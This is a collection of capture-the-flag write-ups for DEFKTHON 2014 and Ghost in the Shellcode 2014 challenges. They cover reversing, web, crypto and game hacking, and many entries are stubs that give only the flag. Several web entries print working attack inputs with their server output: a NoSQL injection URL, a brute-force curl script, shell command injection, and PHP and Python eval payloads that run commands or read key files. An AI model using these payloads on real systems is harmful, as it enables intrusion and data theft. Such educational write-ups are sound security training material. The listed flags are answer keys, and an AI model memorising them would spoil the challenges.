.method public hidebysig instance void Usehint() // CODE XREF: pictureBox1_Click
{
  .maxstack 1
  .locals init (string V0)
  nop
  ldstr    "get_key_from_hint"
  stloc.0
  ret
}
```

So the last place to look for this hint is the horribly coded `pictureBox1_Click` function. Do we somehow have to fix this function and run it? Because now it throws exceptions. Staring at it a bit longer, the string constructed by the program contains `B0wB4me4iamr00t`. This is the key. I know, it doesn’t make much sense…

The solution becomes:

```bash
$ echo -n "B0wB4me4iamr00t" | sha1sum
9df54a6411ed678cdc925b26794052a882830c25  -
echo -n "9df54a6411ed678cdc925b26794052a882830c25" | md5sum
58b4d49e5489be09fc409e4c0b5e66ad
```

The solution is `58b4d49e5489be09fc409e4c0b5e66ad`.

## Other write-ups

* <http://ctfwriteups.blogspot.in/2014/03/defkthon-2014-reversing-100.html>

# DEFKTHON CTF: Reversing 200

**Description:**

> [Segmentation Fault](200)

## Write-up

_This write-up is made by the [HacknamStyle](http://hacknamstyle.net/) CTF team._

The file is a normal Linux 32-bit ELF binary. Open it up in IDA and we see theres a `main` function and a `lol` function. The reverse engineered main function corresponds to the code below. I inlined several comments to explain what the code is trying to accomplish.

```
int main()
{
  int pipefd[2];
  int pid;
  int userinput;
  char kidid[30];

  // Create pipe for communication between child and parent
  pipe(pipefd);

  pid = fork();
  if ( !pid )
  {
    // ----- Start Child Process -----

    // Send Kid ID to the parent process using the pipe
    puts("\nDamn!! i lost my Kid's ID");
    write(pipefd[1], "42447255344574653276838751", 29);

    // Fake segmentation fault message and exit
    puts("Segmentation Fault");
    exit(0);
  }

  // ----- Start Parent Process -----

  // User must enter pid of the child process ("lost my Kid's ID")
  read(pipefd[0], kidid, 29);
  scanf("%d", &userinput);
  if ( userinput == pid )
  {
    // Did the user place a breakpoint on the lol() function? If so, exit.
    if ( *((char *)lol + 3) == 0xCC ) {
      puts(":D");
      exit(1);
    }

    // Got the kid ID from child process, now derive the key from it
    printf("\nGo for the Key!\n ");
    lol(kidid);
  }

  wait(0);
  return 0;
}
```

So the child sends an ID to the parent and then exits. The parent does a simple anti-debugging check by seeing if the user placed a breakpoint on the main function. Recall that 0xCC corresponds to an `int3` instruction, which is a software breakpoint. A debugger normally places this instruction after the function prologue (hence the +3).

Using the latest IDA version we can remove the `userinput == pid` if-test using the Edit -> Patch Program -> "Change byte" and "Apply patches to input file". Replacing it with NOPs gives:

```nasm
call    ___isoc99_scanf
mov     eax, [esp+24h]
cmp     eax, [esp+20h]
nop
nop
mov     eax, offset lol
```

While we’re at it, let’s also remove the call to `scanf`. Now we don’t need to worry anymore about giving the correct input. The `lol` function performs some calculations and ends with the following `if`-test:

```nasm
mov     [ebp+var_C], 0
cmp     [ebp+var_C], 1
jnz     short _nope_not_this

mov     eax, offset format ; "%s"
lea     edx, [ebp+var_13]
mov     [esp+4], edx
mov     [esp], eax      ; format
call    _printf
jmp     short _return

_nope_not_this:
mov     eax, offset aNope_not_this_ ; ASCII string "Nope_Not_This_:("
mov     [esp], eax      ; format
call    _printf
```

In other words, it always jumps to `_nope_not_this`, because it’s a hardcoded `if`-test that compares `0` with `1`. If we again patch away this `if`-test using NOPs it will `printf` some string that was generated by the function. This string turns out to be the solution to the challenge: `dignige`.

## Other write-ups

* <http://www.0xdeffbeef.com/2014/03/defkthon-ctf-2014-segmentation-fault.html>

# DEFKTHON CTF: Reversing 300

**Description:**

> [Password](300.exe)

## Write-up

_This write-up is made by the [HacknamStyle](http://hacknamstyle.net/) CTF team._

So `file 300.exe` says that it’s an ordinary PE32 windows executable. When opening it in IDA and viewing all the strings referenced by the program, we see a lot of Python API functions that are dynamically loaded. It turns out the executable is also a valid ZIP file, and this zip file contains the `hashlib` python module. This is an open source module, suggesting that the program somehow uses this module to check the password entered by the user.

We want to extract the embedded python code. One string located close to the python API function names is `_MEIPASS2`. This string is an environment variable used by [PyInstaller](http://www.pyinstaller.org/export/develop/project/doc/Manual.html). Lucky for us, PyInstaller has a tool called ArchiveViewer to extract Python code from a created executable. Using `ArchiveViewer.py` we extract the python file `challenge1`:

```py
#AJIN ABRAHAM | OPENSECURITY.IN
from passlib.hash import cisco_pix as pix
import sys,base64
user=""
xx=""
if(len(sys.argv)>1):
     x=sys.argv[1]
     hashus = pix.encrypt("DEFCON14-CTF-IS", user=x)
     z=[89,86,69,121,100,82,69,103,98,47,48,103,80,71,77,121]
     for zz in z:
          xx+= chr(zz+(275*100001-275*1000-27225274))
     hashgen = pix.encrypt("DEFCON14-CTF-IS", user=base64.decodestring(xx))
     if(hashgen==hashus):
          print "Oh Man You got it! But :( ===>    " + str(base64.encodestring(base64.decodestring(xx)))
     else:
          print "Naaaaaaa !! You are screweD"
else:
     print "Password !!"
```

As you can see, it stores the password in obfuscated form. Then it uses the key `DEFCON14-CTF-IS` to encrypt both the stored password, and the password entered by the user. We can easily find the password by including the line `print base64.decodestring(xx)`. This prints `easy!asMa@ss`.

## Other write-ups

* <http://rce4fun.blogspot.com/2014/03/defkthon-ctf-2014-reversing-300-writeup.html>

# DEFKTHON CTF: Reversing 400

**Description:**

> [BIN](400.bin)

## Write-up

_This write-up is made by the [HacknamStyle](http://hacknamstyle.net/) CTF team._

Running `file 400.bin` gives no useful information: it only detects data. Similarly, `strings 400.bin` also provides no useful information. Executing `binwalk 400.bin` to extract possible hidden files reveals a Squashfs filesystem with a DD-WRT signature. So we’re dealing with a DD-WRT firmware image.

Using [the Firmware Modification Kit](https://code.google.com/p/firmware-mod-kit/) and executing `extract-firmware.sh 400.bin` successfully extracts the filesystem. Now the question is how and where the flag is hidden:

1. Is a special password configured somewhere? `grep -ri pass .`, nope.
2. Is a flag in plaintext hidden somewhere? `grep -ri flag .`, YES!

In the file `/var/www/` we encountered the line `</html>'flag is caputdraconis`. Hence the flag to solve this level is `caputdraconis`.

## Other write-ups

* none yet

# DEFKTHON CTF: Web 100

**Description:**

> To get it; get the key and put it in my head!!
> [Secret Service](http://54.201.96.212:888/web100/)

## Write-up

(TODO)

## Other write-ups

* none yet

# DEFKTHON CTF: Web 200

**Description:**

> [Auth Me In](http://54.201.96.212:888/web200/)

## Write-up

The hint [“Not SQL”](https://twitter.com/OpenSecurity_IN/status/440536455614443521) tells us not to look for SQL injection. After searching on the Internet about injections that are not an SQL injection, I came up with something called [a NoSQL injection](http://data.story.lu/2011/03/07/nosql-injection-in-mongo-php). A quick look at it and you will learn that, by appending `[$ne]` to the `$_GET` parameter, you can, instead make the query look for things that are ‘not equal’ to whatever you set the value to.

The final solution that resulted in the flag `flag{itoldunaathisisnotSQLinjection}` was
‘http://54.201.96.212:888/web200/?userid[$ne]=a&password[$ne]=a’.

## Other write-ups

* none yet

# DEFKTHON CTF: Web 300

**Description:**

> [we love it!](web300.apk)

## Write-up

We’re given an Android application package file, [`web300.apk`](web300.apk). `*.apk` files are essentially zip files with a different extension. If you rename it to `web300.apk.zip` and extract it, you’ll see it contains a `classes.dex` file. `*.dex` files are compiled Android application code files, containing bytecode for the Dalvik Virtual Machine (the workhorse powering the Android system).

Let’s convert the bytecode in the `classes.dex` file back to a `*.jar` file [using `dex2jar`](https://code.google.com/p/dex2jar/):

```bash
$ d2j-dex2jar web300.apk
dex2jar web300.apk -> web300-dex2jar.jar
```

Now, `*.jar` files are essentially zip files too. We can just rename `web300-dex2jar.jar` to `web300-dex2jar.jar.zip` and unzip it to unpack its contents. Alternatively, this command has the same result:

```bash
$ jar xf web300-dex2jar.jar
```

In this case, the resulting source files aren’t easily readable, so let’s use a decompiler. Open `web300-dex2jar.jar` in [JD-GUI](http://jd.benow.ca/). Now we can view all the source code, or go to _File_ → _Save All Sources_ to save the sources so we can view them in our preferred text editor.

The `com.example.defkthonapp/MainActivity` class looks interesting:

```java
private Runnable Check = new Runnable()
{
  public void run()
  {
    TelephonyManager localTelephonyManager = (TelephonyManager)MainActivity.this.getSystemService("phone");
    String str1 = localTelephonyManager.getDeviceId();
    String str2 = localTelephonyManager.getSimSerialNumber();
    int i = new Random().nextInt(300);
    ((WebView)MainActivity.this.findViewById(2131230723)).postUrl("http://challenges.defconkerala.com/web/300/update.php", EncodingUtils.getBytes("pwd=" + Integer.toString(i) + "&imei=" + str1 + "&div=" + str2, "BASE64"));
  }
};
private EditText paswd;
```

So, the app performs a POST request to `http://challenges.defconkerala.com/web/300/update.php` with `pwd=$password&imei=$deviceID&div=$simSerialNumber` as POST data. The `$deviceID` and `$simSerialNumber` never change for the same device, only the `$password` does — and it is a random integer from 0 (inclusive) to 300 (exclusive).

Testing reveals that the `$deviceID` and `$simSerialNumber` aren’t validated in any way on the server, so we can just use bogus values for them. The `User-Agent` request header seems to be checked though — if it doesn’t contain `Android`, the following response is sent:

```
We love android !!
```

Setting `_Android` as the `User-Agent` header seems to work.

Let’s brute-force the password and see what happens. I wrote a quick shell script for this:

```bash
#!/usr/bin/env bash

deviceID='1337';
simSerialNumber='1337';
user_agent='_Android';

url='http://challenges.defconkerala.com/web/300/update.php';

for password in {0..299}; do
  data="pwd=${password}&imei=${deviceID}&div=${simSerialNumber}";
  curl -s --user-agent "${user_agent}" --data "${data}" "${url}" | grep 'Flag';
done;
```

Let’s run it:

```bash
$ ./web300.sh
Flag is: w00tkitk@t
```

The flag is `w00tkitk@t`.

## Other write-ups

* <http://www.0xdeffbeef.com/2014/03/defkthon-ctf-2014-we-love-it-web-300.html>

# DEFKTHON CTF: Web 400

**Description:**

> [Search Me](http://54.201.96.212:888/web400/web_search.php)

## Write-up

The `web_search.php` endpoint contains a form, and (by default) displays the following error message:

```
Error: Document ID is empty (errcode=0)
```

Let’s enter `test` in the search field and submit the form. [The response](http://54.201.96.212:888/web400/web_search.php?submit=Submit&search=test) contains:

```
Error: Object Not Found - missing (GET /astro_users/test []) (errcode=404)
```

[This error message format](https://www.google.com/search?q="%22Object%20Not%20Found%20-%20missing%22") is a hint that CouchDB is used.

CouchDB has [an `_all_docs` endpoint](http://couchdb.readthedocs.org/en/latest/api/database/bulk-api.html#get--db-_all_docs) that returns a list of all available documents in the database, in JSON format. (Note: [`_changes`](http://couchdb.readthedocs.org/en/latest/api/database/changes.html) could be used as well.) [Let’s take a look](http://54.201.96.212:888/web400/web_search.php?submit=Submit&search=_all_docs):

```
stdClass Object
(
    [total_rows] => 3
    [offset] => 0
    [rows] => Array
        (
            [0] => stdClass Object
                (
                    [id] => flag_for_l33ts
                    [key] => flag_for_l33ts
                    [value] => stdClass Object
                        (
                            [rev] => 4-f9d777fcf20c3fc52943aeba961593e9
                        )

                )

            [1] => stdClass Object
                (
                    [id] => userid1
                    [key] => userid1
                    [value] => stdClass Object
                        (
                            [rev] => 3-3125d533dea89836adec3b8a5a652030
                        )

                )

            [2] => stdClass Object
                (
                    [id] => userid2
                    [key] => userid2
                    [value] => stdClass Object
                        (
                            [rev] => 5-0090aa4c0db1f8d52a74d6134b2e48ef
                        )

                )

        )

)
```

`flag_for_l33ts` sounds interesting. [Let’s check it out](http://54.201.96.212:888/web400/web_search.php?submit=Submit&search=flag_for_l33ts):

```
stdClass Object
(
    [_id] => flag_for_l33ts
    [_rev] => 4-f9d777fcf20c3fc52943aeba961593e9
    [flag_for_l33ts_only] => flag{here_you_go_nice_solving_webChalLenges}
)
```

The flag is `here_you_go_nice_solving_webChalLenges`.

## Other write-ups

* none yet

# Ghost in the Shellcode 2014: A Boaring Quest

**Category:** Choose your Pwn Adventure 2
**Points:** 150
**Description:**

> Challenge available from within PwnAdventure2.

## Write-up

(TODO)

The flag is `ZombieProcessesWillEatYourBrains`.

## Other write-ups

* <http://tasteless.se/2014/01/gits-2014-a-boaring-quest-pwn-adventure-150/>

# Ghost in the Shellcode 2014: Ad Subtract

**Category:** Choose your Pwn Adventure 2
**Points:** 75
**Description:**

> Challenge available from within PwnAdventure2.

## Write-up

The challenge (as explained by an in-game NPC) was to get rid of the ad diplayed in the Game Menu.

Traffic sniffing showed that after starting the game, a request was made to the domain `dontpanicsoftware.com` which delivered the ad images. Let’s route such requests to `localhost`, so we can serve a transparent PNG image instead:

```bash
$ echo '127.0.0.1 dontpanicsoftware.com # GitS2014: Ad Subtract' | sudo tee -a /etc/hosts

$ dscacheutil -flushcache && killall -HUP mDNSResponder
```

After restarting the game, the ads are now transparent/invisible. This reveals the underlying text: `AdBlockedHaveASillyMooseAnyway`.

## Other write-ups

* <http://tasteless.se/2014/01/gits-2014-ad-substract-pwn-adventure-75>

# Ghost in the Shellcode 2014: Boaring Music

**Category:** Choose your Pwn Adventure 2
**Points:** 50
**Description:**

> Find the key! [File](https://2014.ghostintheshellcode.com/boaringfield-6035032d25ae10f0005ac69379c0dd8d9b9b2a12)

## Write-up

In the _Choose Your Pwn Adventure 2_ game, the following additional hint is given:

![](game-screenshot.jpg)

> If you are bored with the boars, I hear there might be something hidden in the music over in the Boaring Field. Stay a while and listen!

(TODO)

The flag is `ASTARISBOARN`.

## Other write-ups

* <http://nopsrus.blogspot.com/2014/01/ghost-in-shellcode-2014-pwn-adventure-2.html>

# Ghost in the Shellcode 2014: Byte Sexual

**Category:** Pwnable
**Points:** 600
**Description:**

> Endian isn’t the only thing that can be interchanged. [File](https://github.com/ctfs/write-ups/blob/master/ghost-in-the-shellcode-2014/byte-sexual/byte_sexual-838ca00502fd07d49dc319c4e78b6a94cee530a8) running at bytesexual.2014.ghostintheshellcode.com.

## Write-up

See [`exploit.py`](https://github.com/ctfs/write-ups/blob/master/ghost-in-the-shellcode-2014/byte-sexual/exploit.py).

(TODO)

The flag is `You really should not mix execution modes`.

## Other write-ups

* [Source code for this challenge (released by the author after the CTF)](https://github.com/LightningTH/GiTS/blob/master/byte_sexual/lightning.py)

# Ghost in the Shellcode 2014: Cave of Nope

**Category:** Choose your Pwn Adventure 2
**Points:** 50
**Description:**

> Challenge available from within PwnAdventure2.

## Write-up

The challenge was to enter the area called ‘Creepy Cave’, bridge a huge gap somehow, and then defeat the Spider Queen.

Crossing the gap can only be done after hacking the game files and increasing the player’s running speed or the jump velocity, for example.

To avoid getting killed by the Spider Queen, you could hack the _Wine_ item modifier, so that drinking wine makes you invulnerable (instead of just slightly boosting your damage resistance).

The flag is `At least it wasnt full of Creepers`.

## Other write-ups

* <http://balidani.blogspot.com/2014/01/ghost-in-shellcode-2014-pwn-adventure-2.html>

# Ghost in the Shellcode 2014: CTF247

**Category:** Recon
**Points:** 100
**Description:**

> CTF247 is awesome <http://ctf247.2014.ghostintheshellcode.com/>

## Write-up

The `ami_id` parameter on [the ‘Fortress’ page](http://ctf247.2014.ghostintheshellcode.com/ec2.php) is vulnerable to command injection.

The response bodies for [`/ec2.php?ami_id=;ls;`](http://ctf247.2014.ghostintheshellcode.com/ec2.php?ami_id=;ls;) or [`/ec2.php?ami_id=%0als%0a`](http://ctf247.2014.ghostintheshellcode.com/ec2.php?ami_id=%0als%0a) start with:

```
ec2-api-tools-1.6.12.0
ec2.php
index.html
index_files
key.php
```

Aha! There’s a file named `key.php`. Let’s see what it says by visiting [`/ec2.php?ami_id=;cat%20key.php;`](http://ctf247.2014.ghostintheshellcode.com/ec2.php?ami_id=;cat%20key.php;) or [`/ec2.php?ami_id=%0acat%20key.php%0a`](http://ctf247.2014.ghostintheshellcode.com/ec2.php?ami_id=%0acat%20key.php%0a):

```php
<?php
  /* flag{0aea26e968895efa40b563e3e8fe8f19} */
  echo('There\'s a key here.');
?>
```

## Other write-ups

* <http://blogs.tunelko.com/2014/01/19/ghost-in-the-shellcode-2014-write-up-ctf247/>
* <http://insertco.in/2014/01/19/ctf247-gits-2014/>

# Ghost in the Shellcode 2014: Dogecrypt

**Category:** Crypto
**Points:** 75
**Description:**

> Wow such crypto [Very download](https://github.com/ctfs/write-ups/blob/master/ghost-in-the-shellcode-2014/dogecrypt/dogecrypt-b36f587051faafc444417eb10dd47b0f30a52a0b) so xz.

## Write-up

(TODO)

The flag is `ShibeSuchDictionaryAttacksWow`.

## Other write-ups

* <http://commandlinewani.blogspot.com/2014/01/ghostintheshellcode-write-up-dogecrypt.html>
* <http://digitaloperatives.blogspot.com/2014/01/ghost-in-shellcode-2014-crypto-75.html>
* <http://insertco.in/2014/01/19/dogecrypt-gits-2014>

# Ghost in the Shellcode 2014: DOS Attack

**Category:** Choose your Pwn Adventure 2
**Points:** 200
**Description:**

> What x86 instruction has been used to allow access to extended memory without ever entering protected mode?

## Write-up

The answer is `LOADALL`.

# Ghost in the Shellcode 2014: Fuzzy

**Category:** Pwnable
**Points:** 301
**Description:**

> We have developed a brand new "exploit mitigation" that makes it IMPOSSIBLE to reverse engineer our apps! [File](https://2014.ghostintheshellcode.com/fuzzy-29074b5fa6ed6aebb16390ef122ad61f7b9200ed) running at fuzzy.2014.ghostintheshellcode.com

## Write-up

(TODO)

The flag is `fuzzingIsFun2`.

## Other write-ups

* <http://ppp.cylab.cmu.edu/wordpress/?p=1146>
* <https://blog.skullsecurity.org/2014/ghost-in-the-shellcode-fuzzy-pwnage-301>

# Ghost in the Shellcode 2014: gitsmsg

**Category:** Pwnable
**Points:** 299
**Description:**

> Find the key! [File](https://github.com/ctfs/write-ups/blob/master/ghost-in-the-shellcode-2014/gitsmsg/gitsmsg-04e8d34d76e3d6dedf79273dad97193377ecb3e3) running at gitsmsg.2014.ghostintheshellcode.com

## Write-up

(TODO)

The flag is `lol, tagged unions for the WIN!`.

## Other write-ups

* <http://ppp.cylab.cmu.edu/wordpress/?p=1152>
* <https://blog.skullsecurity.org/2014/ghost-in-the-shellcode-gitsmsg-pwnage-299>

# Ghost in the Shellcode 2014: Gitzino

**Category:** Crypto
**Points:** 400
**Description:**

> Like all good bitcoin casinos, the gitscoin casino gitzino uses unbreakable Provably Fair technology. [File](https://github.com/ctfs/write-ups/blob/master/ghost-in-the-shellcode-2014/gitzino/gitzino-2c5a188241c1c758e8bd7ef6dba254ccfebd965c) running at gitzino.2014.ghostintheshellcode.com

## Write-up

(TODO)

The flag is `Twister? I hardly knew her`.

## Other write-ups

* <http://ppp.cylab.cmu.edu/wordpress/?p=1140>

# Ghost in the Shellcode 2014: inview

**Category:** Trivia
**Points:** 150
**Description:**

> The key is in view, what is it? [File](https://2014.ghostintheshellcode.com/inview-324b8fb59c14da0d5ca1fe2c31192d80cec8e155)

## Write-up

(TODO)

The flag is `WhitespaceProgrammingIsHard`.

## Other write-ups

* <http://digitaloperatives.blogspot.com/2014/01/ghost-in-shellcode-2014-trivia-150.html>
* <http://delogrand.blogspot.com/2014/01/ghost-in-shellcode-2014-trivia.html>

# Ghost in the Shellcode 2014: Long Live the Queen

**Category:** Choose your Pwn Adventure 2
**Points:** 250
**Description:**

> Find the key! [File](https://github.com/ctfs/write-ups/blob/master/ghost-in-the-shellcode-2014/long-live-the-queen/longlivethequeen-212e921161aed620a58ab6b7840f533ca343e650)

## Write-up

(TODO)

The flag is `TheyCallMeThePhaseBeast`.

# Ghost in the Shellcode 2014: lugkist

**Category:** Trivia
**Points:** 150
**Description:**

> Find the key. [File](https://2014.ghostintheshellcode.com/lugkist-3c99ed66685a73f333dde7cddfe5e9a4fd3651f0)

## Write-up

The headers of the provided `lugkist-3c99ed66685a73f333dde7cddfe5e9a4fd3651f0` file contain `7zXZ`, indicating it’s `xz`-compressed data.

So, extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < lugkist-3c99ed66685a73f333dde7cddfe5e9a4fd3651f0 > lugkist.txt`
* `unxz < lugkist-3c99ed66685a73f333dde7cddfe5e9a4fd3651f0 > lugkist.txt`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x lugkist-3c99ed66685a73f333dde7cddfe5e9a4fd3651f0
```

Then, … (TODO)

The flag is `Power overwhelming? Back in my day cheats did not have spaces.`.

## Other write-ups

* <http://blog.zachorr.com/lugkist/>
* <http://commandlinewani.blogspot.com/2014/01/ghostintheshellcode-write-up-lugkist.html>
* <http://delogrand.blogspot.com/2014/01/ghost-in-shellcode-2014-trivia.html>
* <http://tasteless.se/2014/01/gits-2014-lugkist-trivia-150>
* <https://systemoverlord.com/blog/2014/01/19/ghost-in-the-shellcode-2014-lugkist/>

# Ghost in the Shellcode 2014: Moon Boots

**Category:** Choose your Pwn Adventure 2
**Points:** 50
**Description:**

> Challenge available from within PwnAdventure2.

## Write-up

The challenge was to enter the Moon level somehow.

This can be done in several ways:

1. by hacking the gravity modifier, changing it from `-9.81` to, say, `0.5`
2. by hacking the initial jump velocity modifier, changing it to a value higher than `25`

That way, it’s possible to jump out of bounds on the regular map, which effectively teleports you to the moon.

The flag is `Use a Tab, Space will leave you breathless`.

## Other write-ups

* <http://balidani.blogspot.com/2014/01/ghost-in-shellcode-2014-pwn-adventure-2.html>

# Ghost in the Shellcode 2014: one

**Category:** Recon
**Points:** 1
**Description:**

> What is the marking on the second train? <https://www.youtube.com/watch?v=6lutNECOZFw>

## Write-up

The marking on the second train is `SNC 52`. See <https://www.youtube.com/watch?v=6lutNECOZFw&t=1m04s>.

[![](screenshot.jpg)](https://www.youtube.com/watch?v=6lutNECOZFw&t=1m04s)

# Ghost in the Shellcode 2014: PapSmear

**Category:** Reverse Engineering
**Points:** 150
**Description:**

> Solve the challenge! [File](https://2014.ghostintheshellcode.com/pap_smear-1fb0104b24e15c5427281de92727f74c7a50fee5) running at papsmear.2014.ghostintheshellcode.com:7777

## Write-up

(TODO)

The flag is `ThesePrimesAreNotIllegal`.

## Other write-ups

* <http://balidani.blogspot.com/2014/01/ghost-in-shellcode-2014-papsmear-writeup.html>

# Ghost in the Shellcode 2014: phpcrypto

**Category:** Recon
**Points:** 100
**Description:**

> GitS Presents [PHPCrypto 0.000001](http://phpcrypto.2014.ghostintheshellcode.com/)

## Write-up

The HTML source code of the linked page contains the following:

```js
function encrypt()
{
  key = $("#key")[0].value;
  plaintexthex = toHex($("#plaintext")[0].value);
  function success(data) {$("#ciphertext")[0].value = $.parseJSON(data).returnValue;}
  $.post('crypto.php', {"function":"customCrypto", "key":key, "plaintexthex":plaintexthex}, success );
}

function decrypt()
{
  key = $("#key")[0].value;
  ciphertext = $("#ciphertext")[0].value;
  function success(data) {$("#plaintext")[0].value = toAscii($.parseJSON(data).returnValue);}
  $.post('crypto.php', {"function":"customCrypto", "key":key, "plaintexthex":ciphertext}, success );
}
```

So, for encoding and decoding, a POST request is made to `/crypto.php` with the name of the function (`customCrypto`), the entered key, and the hexadecimal representation of the input text (for encoding) or the ciphertext (for decoding).

There’s also this comment:

```js
/*
TODO: add support for "help" and "dump" functions
*/
```

When using the `dump` function, the server returns an HTML document containing the syntax-highlighted source code of [the PHP script](https://github.com/ctfs/write-ups/blob/master/ghost-in-the-shellcode-2014/phpcrypto/source.php):

```bash
$ curl http://phpcrypto.2014.ghostintheshellcode.com/crypto.php --data 'function=dump' > source.html
```

In some cases [the `customCrypto` function](https://github.com/ctfs/write-ups/blob/af43d4f482f869c9c3ba5a0c0bd88e57adf0f39e/ghost-in-the-shellcode-2014/phpcrypto/source.php#L68-L130) ends up in a code path where [`assert()`](http://php.net/assert) is executed:

```php
assert("\$message = \"ERROR! xorKey is: \".strlen(\$xorKey).\" bytes long and the plaintext is: \".strlen($plaintext).\" bytes long.\";");
```

`assert` is like `eval`, except it terminates script execution if the result is `false`. To get there, we need to pass the string `'true'` as the value for the third argument (`$DEBUG`).

That is possible because of this code:

```php
$params = $_POST;
unset($params['function']);

$param_string='';
foreach($params as $key=>$param)
{
    $param = preg_replace('/[^A-Za-z0-9]/','',$param);
    $param_string.=(($param_string)?',':'')."'".$param."'";
}

if (isset($DEBUG) && $DEBUG == "true") { error_log($_POST['function']."($param_string);"); }
eval("echo ".$_POST['function']."($param_string);");
```

All we need to do is use `DEBUG=true` (or `x=true` — the key doesn’t really matter) as the third key/value pair in the POST data, not counting the `function` parameter. This enables remote code execution:

```bash
$ echo -n '").system("ls");//' | xxd -p # will be used as the value for `plaintexthex`
22292e73797374656d28226c7322293b2f2f

$ curl http://phpcrypto.2014.ghostintheshellcode.com/crypto.php --data 'function=customCrypto&key=a&plaintexthex=22292e73797374656d28226c7322293b2f2f&DEBUG=true'
crypto.php
index.php
jquery-1.8.0.min.js
key
{"errorMsg":"The key is: ; and the plaintext is: key","returnValue":"1912154842484f5e56131957481912001414"}
```

Aha! There’s a file named `key`. Let’s see what it says:

```bash
$ curl http://phpcrypto.2014.ghostintheshellcode.com/key
ThisWasAStupidTestKeyThatBecameARealBoy
```

## Other write-ups

* <http://tasteless.se/2014/01/gits-2014-phpcrypto-recon-100/>

# Ghost in the Shellcode 2014: Pillowtalk

**Category:** Crypto
**Points:** 200
**Description:**

> Find the key! [File](https://2014.ghostintheshellcode.com/pillowtalk-a692e2669fa69d57870e55608888f02303d35ca3).

## Write-up

The headers of the provided `pillowtalk-a692e2669fa69d57870e55608888f02303d35ca3` file contain `7zXZ`, indicating it’s `xz`-compressed data.

So, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x pillowtalk-a692e2669fa69d57870e55608888f02303d35ca3
```

Then, … (TODO)

The flag is `WhyDoFartsSmell?SoTheDeafCanEnjoyThemAlso`.

## Other write-ups

* <https://systemoverlord.com/blog/2014/01/19/ghost-in-the-shellcode-2014-pillowtalk/>
* <http://broot.ca/gitsctf-pillowtalk-crypto-200>
* <https://www.youtube.com/watch?v=G50typU3mLg>

# Ghost in the Shellcode 2014: Portal

**Category:** Choose your Pwn Adventure 2
**Points:** 200
**Description:**

> Find the key! [File](https://2014.ghostintheshellcode.com/portal-f94ee69683a4275df11707cd4a14f611ce12b5a0)

## Write-up

(TODO)

The flag is `Cave Johnson hates Black Mesa`.

## Other write-ups/resources

* <http://digitaloperatives.blogspot.com/2014/01/ghost-in-shellcode-2014-choose-your-pwn.html>
* [Source code for this challenge (released by the author after the CTF)](https://github.com/LightningTH/GiTS/tree/master/Portal)
* [Video of challenge](https://www.youtube.com/watch?v=70yLPDX7UxA)

# Ghost in the Shellcode 2014: Rabbit of Caerbannog

**Category:** Choose your Pwn Adventure 2
**Points:** 75
**Description:**

> Challenge available from within PwnAdventure2.

## Write-up

The challenge was to defeat a seemingly invincible rabbit.

Reading the code reveals that it can only be killed using a _Holy Hand Grenade_, an item that can only be traded for _89 gears_. Unfortunately, there is no legitimate way to get _gears_.

However, you can get them by triggering an integer overflow. Try to buy 999,999,999 Holy Hand Grenades at once, and this will give you lots of grenades and lots of gears, too.

The flag is `Thy_foe_b31ng_n4ughty_1n_My_s1ght_shall_snuff_it`.

## Other write-ups

* <http://balidani.blogspot.com/2014/01/ghost-in-shellcode-2014-pwn-adventure-2.html>
* <http://tasteless.se/2014/01/gits-2014-rabbit-of-caerbannog-pwn-adventure-75/>

# Ghost in the Shellcode 2014: Radioactive

**Category:** Crypto
**Points:** 250
**Description:**

> Find the key. [File](https://2014.ghostintheshellcode.com/radioactive-684d33ba06af30b9ad1a79abb3c6cecec74db18e) running at radioactive.2014.ghostintheshellcode.com:4324.

## Write-up

Write-up by [Matir](https://systemoverlord.com/).

The headers of the provided `radioactive-684d33ba06af30b9ad1a79abb3c6cecec74db18e` file contain `7zXZ`, indicating it’s `xz`-compressed data.

So, extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < radioactive-684d33ba06af30b9ad1a79abb3c6cecec74db18e > radioactive.txt`
* `unxz < radioactive-684d33ba06af30b9ad1a79abb3c6cecec74db18e > radioactive.txt`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x radioactive-684d33ba06af30b9ad1a79abb3c6cecec74db18e
```

Then, you can see that the included code is a Python script, the core of which is below:

```python
class RadioactiveHandler(SocketServer.BaseRequestHandler):
  def handle(self):
    key = open("secret", "rb").read()
    cipher = AES.new(key, AES.MODE_ECB)

    self.request.send("Waiting for command:\n")
    tag, command = self.request.recv(1024).strip().split(':')
    command = binascii.a2b_base64(command)
    pad = "\x00" * (16 - (len(command) % 16))
    command += pad

    blocks = [command[x:x+16] for x in xrange(0, len(command), 16)]
    cts = [str_to_bytes(cipher.encrypt(block)) for block in blocks]
    for block in cts:
      print ''.join(chr(x) for x in block).encode('hex')

    command = command[:-len(pad)]

    t = reduce(lambda x, y: [xx^yy for xx, yy in zip(x, y)], cts)
    t = ''.join([chr(x) for x in t]).encode('hex')

    match = True
    print tag, t
    for i, j in zip(tag, t):
      if i != j:
        match = False

    del key
    del cipher

    if not match:
      self.request.send("Checks failed!\n")
    eval(compile(command, "script", "exec"))

    return
```

So, it looks for a `tag:command` pair, where the tag is hex-encoded and the command is base64-encoded. The command must be valid Python, passed through `compile` and `eval`, so you’ll need to send a response back to yourself via `self.request.send()`.

So how’s the tag calculated? Every 16-byte block of the command is encrypted in AES-ECB mode (so, two identical plaintexts == two identical ciphertexts) and then the encrypted blocks are XORed together, producing the final tag. My first thought was to generate a plaintext such that `len(plain) % 16 == 0`, then repeat it twice, so the XORs will cancel out and give a tag of `00…00`. Unfortunately, the padding must be at least one byte long, and the plaintext cannot contain null bytes.

So, we were also provided some sample code. One such example, decoded from its base64 representation, turns out to be:

```python
import os

self.request.send("Send command to eval: \n")
cmd = self.request.recv(1024).strip()

good = True
for b in cmd:
  if b not in '0123456789+-=/%^* ()':
    good = False

if good:
  self.request.send(str(eval(cmd)) + "\n")
else:
  self.request.send("???\n")
```

It turns out the line `good = False` (and two trailing newlines) are their own 16-byte block. We can append `good = True \n\n` to reset it to the value of `True`, and append it a second time to get our tag to come out correctly. Then we can simply provide `self.request.send(open('key').read())` when we receive our “Send command to `eval`:” prompt, and this got our flag.

Alternatively, because of a bug in the signature checking, we can just send the base64-encoded payload as long as we provide an empty tag:

```bash
$ base64 <<< "self.request.send(open('key').read())"
c2VsZi5yZXF1ZXN0LnNlbmQob3Blbigna2V5JykucmVhZCgpKQo=

